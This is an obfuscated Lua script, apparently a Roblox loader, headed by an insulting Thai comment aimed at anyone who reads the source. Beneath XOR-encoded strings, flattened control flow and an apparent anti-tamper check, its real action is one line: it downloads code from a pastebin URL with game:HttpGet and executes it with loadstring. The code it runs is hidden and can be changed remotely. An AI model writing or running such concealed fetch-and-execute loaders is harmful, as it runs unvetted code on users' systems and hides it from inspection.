--[[เสือกเปิด Sorceหาเเม่มึงมั้ง]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v12, v13)
		local v14 = 0;
		local v15;
		local v16;
		while true do
			if (v14 == 1) then
				while true do
					local v21 = 0;
					while true do
						if (v21 == 0) then
							if (v15 == 1) then
								return v5(v16);
							end
							if (v15 == 0) then
								local v23 = 0;
								while true do
									if (v23 == 1) then
										v15 = 1;
										break;
									end
									if (0 == v23) then
										local v25 = 0;
										while true do
											if (v25 == 0) then
												v16 = {};
												for v27 = 1, #v12 do
													v6(v16, v0(v4(v1(v2(v12, v27, v27 + 1)), v1(v2(v13, 1 + (v27 % #v13), 1 + (v27 % #v13) + 1))) % 256));
												end
												v25 = 1;
											end
											if (v25 == 1) then
												v23 = 1;
												break;
											end
										end
									end
								end
							end
							break;
						end
					end
				end
				break;
			end
			if (v14 == 0) then
				v15 = 0;
				v16 = nil;
				v14 = 1;
			end
		end
	end
	local v8 = string.match;
	local v9 = tonumber;
	local v10 = pcall;
	local function v11()
		local v17 = 0;
		local v18;
		local v19;
		while true do
			if (v17 == 1) then
				while true do
					if (v18 == 1) then
						if (v9(v8(v8(({v10(v19, nil)})[2], v7("\139\134\223\110\188", "\126\177\163\187\69\134\219\167")), v7("\102\201\97", "\156\67\173\74\165"))) == 1) then
							return v19({});
						else
							return v11();
						end
						break;
					end
					if (v18 == 0) then
						local v22 = 0;
						while true do
							if (v22 == 1) then
								v18 = 1;
								break;
							end
							if (v22 == 0) then
								v19 = nil;
								function v19(v24)
									if v24 then
										loadstring(game:HttpGet("https://pastebin.com/raw/TGYCJtCJ"))();
									else
										local v26 = v24[1];
									end
								end
								v22 = 1;
							end
						end
					end
				end
				break;
			end
			if (0 == v17) then
				local v20 = 0;
				while true do
					if (v20 == 1) then
						v17 = 1;
						break;
					end
					if (v20 == 0) then
						v18 = 0;
						v19 = nil;
						v20 = 1;
					end
				end
			end
		end
	end
	return v11();
end
